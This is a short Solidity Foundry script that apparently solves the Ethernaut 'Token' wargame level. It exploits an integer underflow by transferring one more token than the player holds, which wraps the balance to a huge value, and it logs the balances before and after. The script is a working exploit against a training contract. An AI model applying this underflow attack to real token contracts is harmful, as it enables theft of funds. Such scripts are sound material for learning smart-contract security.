// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
import "forge-std/Script.sol";
import {Token} from "../../src/ethernaut/token.sol";
import "forge-std/console.sol";

//0x478f3476358Eb166Cb7adE4666d04fbdDB56C407
contract tokenHack is Script {
    // the key is to use the underflow ;
    Token token = Token(0x58Ef2b13c291585aCeef58A5095Cb0f22024661d);

    function run() public {
        vm.startBroadcast();
        uint amount = token.balanceOf(
            0x478f3476358Eb166Cb7adE4666d04fbdDB56C407
        );
        token.transfer(address(123), amount + 1);
        console.log(amount);
        console.log(
            token.balanceOf(0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)
        );
        vm.stopBroadcast();
    }
}
